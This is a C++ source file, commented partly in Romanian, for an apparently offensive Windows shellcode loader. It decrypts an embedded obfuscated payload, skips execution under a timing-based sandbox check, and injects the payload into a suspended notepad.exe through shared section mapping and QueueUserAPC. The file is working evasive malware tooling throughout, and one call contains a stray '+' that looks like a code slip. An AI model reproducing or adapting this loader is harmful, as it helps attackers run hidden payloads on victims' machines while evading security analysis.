#include <iostream>
#include <Windows.h>
#include <vector>
#include <time.h>

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

using NtCreateSection = NTSTATUS(NTAPI*)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
	IN OPTIONAL PLARGE_INTEGER MaximumSize,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN OPTIONAL HANDLE FileHandle);

using NtMapViewOfSection = NTSTATUS(NTAPI*)(
	IN HANDLE SectionHandle,
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG_PTR ZeroBits,
	IN SIZE_T CommitSize,
	IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
	IN OUT PSIZE_T ViewSize,
	IN DWORD InheritDisposition,
	IN ULONG AllocationType,
	IN ULONG Win32Protect);

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;

using NtUnmapViewOfSection = NTSTATUS(NTAPI*)(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress OPTIONAL);

typedef void (WINAPI* SleepFunctionPointer)(
	DWORD dwMilliseconds
);

char* Decrypt(char* rShellcode, int sShellcodeSize, unsigned char bKey) {

	sShellcodeSize = sShellcodeSize / 2;
	char* pShellcode = (char*)malloc((sShellcodeSize) * sizeof(char));

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = rShellcode[i * 2];
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ '\n') - '\\') & '\xFF';
	}

	for (size_t i = 0; i < sShellcodeSize / 2; i++) {
		char temp = pShellcode[i];
		pShellcode[i] = pShellcode[sShellcodeSize - i - 1];
		pShellcode[sShellcodeSize - i - 1] = temp;
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ 'Q') - 'R') & '\xFF';
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ bKey) - bKey) & '\xFF';
	}

	return pShellcode;
}

int main() {
	char rShellcode[] =
		"\xd8\x29\x6a\x23\x53\xbe\xcf\x84\x78\xe1\x25\x6c\xaf\xd6\xa2"
		"\xae\x2c\x52\x5c\x90\x55\x49\xa7\xf1\x5d\xf1\x82\xbb\x6a\xe9"
		"\x14\xeb\x79\xb3\xb8\xa6\x33\xdb\xe8\x3c\x2d\x87\xa3\x0c\x4c"
		"\x3e\x2d\x99\xae\x24\x54\x5e\x2d\x0d\x6a\x1c\x6a\x06\x6a\xb7"
		"\xf1\x47\x8c\xde\xdb\xb3\x6a\x12\x2c\x4d\xd8\xc8\x6a\x43\xf4"
		"\xbb\x20\x8b\xbb\xa6\xb8\x1f\x57\x03\x14\x5a\x5c\x7d\x52\x09"
		"\xd8\x38\x6a\x25\xe5\x1f\x9a\x5d\xfa\xd4\x86\xcb\x57\xfc\x14"
		"\x96\x37\xf5\x55\x45\xa7\x3b\x5d\x13\x14\x0d\x55\x89\x55\x0a"
		"\x15\x1c\x55\xdb\x0d\xae\x5c\x32\x52\x20\x14\x9a\x5d\x50\x4d"
		"\xee\xb0\x40\x55\x78\x3d\x36\xee\xfd\xd8\x12\x6a\x49\x0a\x32"
		"\xad\xf6\xdc\x9e\x6f\x7d\x57\x49\x14\xdc\x3c\xad\xec\x4f\x2d"
		"\x14\xb7\xf2\xec\x44\x2d\x40\x25\x66\xec\xd0\x2c\x6b\xac\xc4"
		"\xe4\x30\x20\xb7\xa2\x32\xec\x3b\x2c\xa1\xae\x22\xec\xf6\x2d"
		"\x22\xd8\x91\x6a\x9d\x88\xe1\x5e\x8b\xc9\x1f\x5d\xda\x57\xb0"
		"\x14\xca\xac\x99\xe4\x02\x2d\xb9\x3f\x72\xec\x9d\x2d\x49\x5d"
		"\x2c\x14\x80\x55\x7e\x55\xc5\x85\x99\x55\xd5\x0d\xe9\x5c\x80"
		"\x14\xb2\x15\xea\xa7\xc9\x33\xcc\xec\x53\x0b\xbf\x35\x67\xa9"
		"\xd6\xee\xbf\x2d\x14\x58\xd6\xeb\x7e\x55\x2d\x3d\xdc\xee\x8e"
		"\xd8\x66\x6a\x83\x0a\xef\xad\x57\xdc\x49\x6f\x61\x57\xff\x14"
		"\x69\x3c\x8f\xec\x61\x2d\xcd\x5d\xd1\x14\x1e\x69\x9d\xa7\x9c"
		"\xac\x16\xe4\x72\x20\x72\x8f\xe6\xec\x1d\x2d\xf0\x85\x84\x81"
		"\x4f\xee\x4a\x2d\x77\x55\x02\x55\xd7\x55\xe8\x1e\x39\x8d\x2c"
		"\x88\x53\xb8\xcb\xdb\xc9\x6a\x12\x2c\x1e\x87\x33\xb9\x74\x95"
		"\x9e\xe8\x0c\xd8\xf4\x6a\xd5\xf4\xd4\xb9\x9f\xc8\xd4\x1c\xa4"
		"\x57\x59\x14\x7e\x3c\x35\xec\xcf\x2d\x32\x8f\x22\xec\xf4\x21"
		"\xcc\x5d\xcf\x14\xd3\x85\x90\xa7\x2d\xa2\x48\xec\xd3\x2d\x8f"
		"\xd8\x75\x6a\xe6\x75\xd9\x8a\x1d\x9a\x2a\x27\xe5\x57\xc0\x14"
		"\xf7\x94\x2b\xec\x78\x2d\x81\x95\x87\x6a\x44\x2d\x0e\xaf\x5f"
		"\xec\x50\x2d\x00\x95\xd4\x6a\x61\x2d\x8d\x95\xbe\xe4\x7b\x20"
		"\x05\xac\x15\xe4\x07\x20\x3b\x45\x33\x45\x82\x0b\x1f\x14\x18"
		"\x87\x70\xa7\x92\xd8\xda\x6a\x64\x55\x54\xa6\xce\xd5\xb1\x4c"
		"\x85\x57\x3e\x14\x69\x5c\x15\x55\xf8\x55\x46\x54\x6a\x54\x04"
		"\x0d\x96\x27\x73\xec\x0e\x21\xd9\xd8\x16\x6a\x2f\x62\x67\x43"
		"\x68\xb2\xd4\x21\xf7\x57\x4a\x14\x4a\x24\xd0\xec\x57\x21\x68"
		"\x89\x76\xec\xfa\x2c\x16\x59\xbb\x14\x11\xd1\xad\x40\xae\xcd"
		"\x24\x95\x88\x15\x79\x4a\xfe\x55\x52\x6f\xdb\x71\x25\x2c\x43"
		"\x88\xe5\xec\x3c\x2c\xf4\x55\x45\x55\xd3\x54\xd8\xb5\x28\x81"
		"\xce\xd4\x0b\x2d\xf5\x83\xc5\xec\x60\x2c\x59\x53\x3d\x14\x97"
		"\x55\x27\x55\x8a\xff\x59\xfe\x76\x0a\x2d\xff\xd0\xbe\xc2\xb2"
		"\xc9\xab\xcd\x2c\x68\x50\xd4\x6a\x49\x6a\x6a\x6a\x79\x46\x25"
		"\x8c\x08\x9f\x61\x06\x40\x2d\x14\x37\xb1\x5c\x3b\x14\x6a\x5d"
		"\xa5\x75\x11\x6a\x28\x5f\xc1\x14\x8c\x35\xd6\x81\xa9\xee\x0b"
		"\x2d\x87\x37\x97\x14\x8c\x5c\x2f\x14\xf1\x5d\x15\x14\x1d\x37"
		"\x9a\x5c\x95\x0b\xc1\x5d\x9b\x14\xe1\x5d\xc0\x14\x7e\xc5\xe9"
		"\x54\xa8\x2d\x9a\xed\xa7\x69\x86\x06\xc2\x14\xb5\xc5\x54\x54"
		"\xbf\x2c\x9a\x91\xe7\x15\xd9\x06\x23\x29\xd1\x2d\x55\x61\x90"
		"\x06\x38\x14\x28\x03\xd1\xc5\xd9\x54\x6c\x2c\xa1\x49\x66\x15"
		"\x5e\x06\x4e\x29\xe1\x5d\x30\xdd\x9c\xb8\xfe\xc4\xd9\xfc\x71"
		"\x28\x9f\x6d\xe2\x49\xa5\x21\xe2\x6e\x0c\x21\x9b\x24\xb4\xb8"
		"\x47\x75\x65\xfd\x38\x94\x2a\x54\x46\x14\x89\xc1\xa9\x60\x82"
		"\xac\x79\x94\x7a\x14\x76\x95\x78\xe4\xc2\x2d\x63\xac\xb1\xe4"
		"\x26\x20\xdf\xd3\xda\x54\x29\x2d\x6d\xed\x3e\xf9\x62\x06\xe0"
		"\x14\x96\xac\x12\x6a\x34\x2d\xbf\x53\x39\x8e\xa6\xc5\x3f\x54"
		"\x89\x2c\x5e\x35\xf1\x15\x6d\x06\x0e\x29\xe3\x45\x6c\x9d\x28"
		"\x2d\xa1\x06\x1e\xc5\x20\x54\x1d\x2d\xcb\x02\xc2\xb9\x03\x95"
		"\x3f\xe8\x41\x2d\x07\x55\x84\x55\x0f\x55\x14\xed\x05\xd5\x65"
		"\x06\x1b\x55\x28\x55\x61\x55\xc9\xbf\xc5\xe8\xe7\x9a\x2c\x6f"
		"\x8e\x86\x46\x9d\x36\xbd\x08\xd4\xdc\x03\xf3\xc5\xa8\x54\x8d"
		"\x2d\xfe\xf1\xbe\x2f\xf2\x06\xeb\x35\x71\x5f\xff\x06\xa0\x2d"
		"\xd0\x44\x3b\x14\x75\x5f\x06\x80\x8c\x8f\x7e\x94\x87\x54\x78"
		"\x14\x73\x60\x4d\xac\xd0\x94\xbe\x14\x82\x35\xbe\x41\xdb\x6f"
		"\xc2\xb1\x46\xf4\x41\xf1\x2b\xc1\x8c\x95\xfa\xe4\x30\x2d\x7f"
		"\x47\x70\x47\xf0\x72\xa7\x9a\x54\x2d\x86\xac\x32\xe4\x95\x20"
		"\xaa\x45\x5b\xbf\x68\x06\x13\x2d\x0b\x35\xe6\x5f\xfc\x06\xf5"
		"\x2d\xca\x9d\xbe\x5f\x7d\x06\x9f\x2d\x89\xf5\x8a\x5f\x41\x06"
		"\x1b\x2d\xfd\x08\xb8\x53\x4f\xdf\x68\xe4\xf6\x2d\x72\x44\x7b"
		"\x5f\x14\x45\x99\x14\xcd\x44\xd3\x14\x0d\x55\xf0\x55\x44\x55"
		"\x3a\xa1\xb4\x8d\xa6\x25\x66\x89\x53\xee\x33\x2d\x0b\x31\xcb"
		"";
	DWORD shellcodeSize = 1020;

	// function import module
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	HMODULE hUser = GetModuleHandle(L"kernel32.dll");

	NtCreateSection ntCreateSection = (NtCreateSection)
		GetProcAddress(hNtdll, "NtCreateSection");

	NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)
		GetProcAddress(hNtdll, "NtMapViewOfSection");

	NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)
		GetProcAddress(hNtdll, "NtUnmapViewOfSection");

	SleepFunctionPointer Sleep = (SleepFunctionPointer)
		GetProcAddress(hUser, "Sleep");

	// Sandbox Evasion
	int start = (int)time(NULL);
	Sleep(3000);
	int stop = (int)time(NULL);

	if ((stop - start) != 3){
		return 0;
	}

	//char* shellcode = Decrypt(rShellcode, shellcodeSize, '"');
	char* shellcode = Decrypt(rShellcode, shellcodeSize, '"');
	shellcodeSize /= 2;
	HANDLE hSection;
	LARGE_INTEGER szSection = { shellcodeSize };

	NTSTATUS status = ntCreateSection(
		&hSection, // handle-ul sectiunii
		SECTION_ALL_ACCESS,
		NULL,
		&szSection, // marimea sectiunii create
		PAGE_EXECUTE_READWRITE, // permisiuni - RWX
		SEC_COMMIT, // pornim atributul commit
		NULL);

	PVOID hLocalAddress = NULL;
	SIZE_T viewSize = 0;

	status = ntMapViewOfSection(
		hSection,
		GetCurrentProcess(), // specificam handle-ul procesului curent
		&hLocalAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);

	RtlCopyMemory(hLocalAddress, shellcode, shellcodeSize);

	PVOID hRemoteAddress = NULL; // adresa preluata de sectiune, in cadrul procesului tinta

	LPSTARTUPINFOW       si;
	PPROCESS_INFORMATION pi;
	BOOL                 success;

	si = new STARTUPINFOW();
	si->cb = sizeof(LPSTARTUPINFOW);

	pi = new PROCESS_INFORMATION();

	wchar_t cmd[] = L"notepad.exe\0"; // procesul pe care il creem

	success = CreateProcess(
		NULL,
		cmd,
		NULL,
		NULL,
		FALSE, // daca handle-ul va fi mostenit de la procesul parinte
		CREATE_SUSPENDED,
		NULL,
		NULL,
		si, // pointer la STARTUPINFO sau STARTUPINFOEX - necesar
		pi); // pointer la PROCESS_INFORMATION - necesar

	status = ntMapViewOfSection(
		hSection,
		pi->hProcess, // specificam handle-ul procesului tinta
		&hRemoteAddress,
		NULL,
		NULL,
		NULL,+			
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);

	QueueUserAPC(
		(PAPCFUNC)hRemoteAddress, // pointer catre functia executata ca shellcode
		pi->hThread, // handle-ul thread-ului
		0
	);

	ResumeThread(pi->hThread);

	status = ntUnmapViewOfSection(
		GetCurrentProcess(),
		hLocalAddress);

	std::cout << "[+] Created process with PID: " << pi->dwProcessId << std::endl;
	std::cout << "[+] Thread ID: " << pi->dwThreadId << std::endl;

	WaitForSingleObject(pi->hThread, INFINITE);

    return 0;
}